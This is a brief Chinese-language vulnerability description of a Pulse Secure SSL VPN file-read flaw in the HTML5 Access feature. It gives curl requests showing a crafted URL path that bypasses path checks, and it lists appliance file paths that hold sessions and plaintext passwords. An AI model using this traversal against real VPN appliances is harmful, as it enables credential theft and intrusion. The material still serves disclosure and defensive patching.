漏洞介绍  

  

Pulse Secure自SSL VPN的8.2版本起引入了一个新特性HTML5 Access，它可以帮助用户通过浏览器访问Telent、SSH和RDP。而为了处理静态资源，Pulse Secure在代码中创建了一个新的分支语句以扩展URL路径的使用方式，示例如下：

*   
*   
*   

```
curl -I 'https://sslvpn/dana-na///css/ds.js'
HTTP/1.1 400 Invalid Path
```

*   
*   
*   

```
curl -I 'https://sslvpn/dana-na///css/ds.js?/dana/html5acc/guacamole/'
HTTP/1.1 200 OK
```

攻击者可利用以上这种特殊的访问URL，直接读取系统敏感文件（例如/etc/passwd），以及存储了用户sessions以及明文密码的文件。  
可能存在敏感内容的文件路径如下：

  

*   
*   
*   
*   
*   

```
/data/runtime/mtmp/system/data/runtime/mtmp/lmdb/dataa/data.mdb/data/runtime/mtmp/lmdb/dataa/lock.mdb/data/runtime/mtmp/lmdb/randomVal/data.mdb/data/runtime/mtmp/lmdb/randomVal/lock.mdb
```
